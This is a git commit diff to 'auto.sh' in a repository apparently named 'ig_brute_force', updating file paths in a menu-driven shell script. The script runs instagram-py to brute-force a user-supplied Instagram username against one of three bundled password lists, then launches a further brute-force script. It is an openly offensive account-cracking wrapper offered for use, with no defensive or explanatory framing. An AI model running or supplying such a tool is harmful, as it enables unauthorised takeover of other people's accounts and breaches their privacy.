131d0a94448836442c4ca865961344a5c5203817
Incredible Hacker <78790759+IncredibleHacker@users.noreply.github.com>
2021-09-14 21:28:32 +0530

    Update auto.sh

--- ig_brute_force/main/auto.sh
+++ ig_brute_force/main/auto.sh
@@ -32,15 +32,15 @@ read -p "[#] Enter Selected Number: " marks
 echo 
 if [ $marks = 1 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass1.txt 
+    instagram-py --username $usrnm --password-list $HOME/ig_brute_force/pass/pass1.txt 
  
 elif [ $marks = 2 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass2.txt
+    instagram-py --username $usrnm --password-list $HOME/ig_brute_force/pass/pass2.txt
  
 elif [ $marks = 3 ]
 then
-    instagram-py --username $usrnm --password-list $HOME/ighack/pass/pass3.txt
+    instagram-py --username $usrnm --password-list $HOME/ig_brute_force/pass/pass3.txt
 else
 echo
 echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"
@@ -49,5 +49,5 @@ sleep 1.0
 cd $HOME/insta-hack
 fi
 sleep 10.0
-cd $HOME/insta-hack/ighack
-bash ighack.sh
+cd $HOME/insta-hack/ig_brute_force
+bash ig_brute_force.sh
